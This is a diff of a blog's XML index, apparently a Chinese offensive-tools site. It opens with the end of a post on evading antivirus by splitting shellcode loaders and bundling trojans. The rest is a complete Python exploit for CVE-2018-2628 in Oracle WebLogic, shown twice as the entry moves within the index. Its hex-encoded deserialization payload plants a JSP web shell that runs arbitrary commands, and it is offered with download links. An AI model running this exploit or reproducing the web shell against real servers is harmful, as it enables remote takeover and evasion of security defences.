+<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
+<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
+<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
+<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
+<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
+<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
+<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
+<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
+<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
+<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
+<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
+<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
+<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
+<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Cobalt Strike</category>
+        <category>Metasploit</category>
+        <category>ShellCode</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
+        <tag>BypassAV</tag>
       </tags>
   </entry>
   <entry>
@@ -9138,6 +9138,55 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
+    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
+    <url>/p/b8e58f69.html</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<hr>
+<ul>
+<li>漏洞威胁：RCE--远程代码执行</li>
+<li>漏洞组件：weblogic</li>
+<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
+</ul>
+<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
+# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
+
+<p>from <strong>future</strong> import print_function</p>
+<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
+<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
+<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
+return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
+<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
+<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
+<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
+<pre><code>rs=send_payload_objdata(sock, payload)
+#print(&apos;response: &apos; + rs)
+print(&apos;exploit completed!&apos;)
+print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
+print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
+<pre><code>dip = sys.argv[1]
+dport = int(sys.argv[2])
+exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
+</div>
+<h2>&nbsp;演示:</h2>
+<p><img alt data-original="https://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
+<h2>附件说明:</h2>
+<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>GetShell</tag>
+        <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>全版本IIS提权工具iislpe</title>
     <url>/p/6b9b3afe.html</url>
     <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
@@ -9227,67 +9276,18 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
-        <category>嗅探</category>
         <category>信息收集</category>
+        <category>嗅探</category>
+        <category>编程</category>
         <category>Python</category>
       </categories>
       <tags>
+        <tag>Tool</tag>
         <tag>Code</tag>
-        <tag>Tool</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
-    <url>/p/b8e58f69.html</url>
-    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<hr>
-<ul>
-<li>漏洞威胁：RCE--远程代码执行</li>
-<li>漏洞组件：weblogic</li>
-<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
-</ul>
-<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
-# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
-
-<p>from <strong>future</strong> import print_function</p>
-<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
-<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
-<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
-return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
-<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
-<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
-<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
-<pre><code>rs=send_payload_objdata(sock, payload)
-#print(&apos;response: &apos; + rs)
-print(&apos;exploit completed!&apos;)
-print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
-print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
-<pre><code>dip = sys.argv[1]
-dport = int(sys.argv[2])
-exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
-</div>
-<h2>&nbsp;演示:</h2>
-<p><img alt data-original="https://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
-<h2>附件说明:</h2>
-<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>GetShell</tag>
-        <tag>Weblogic</tag>
       </tags>
   </entry>
   <entry>
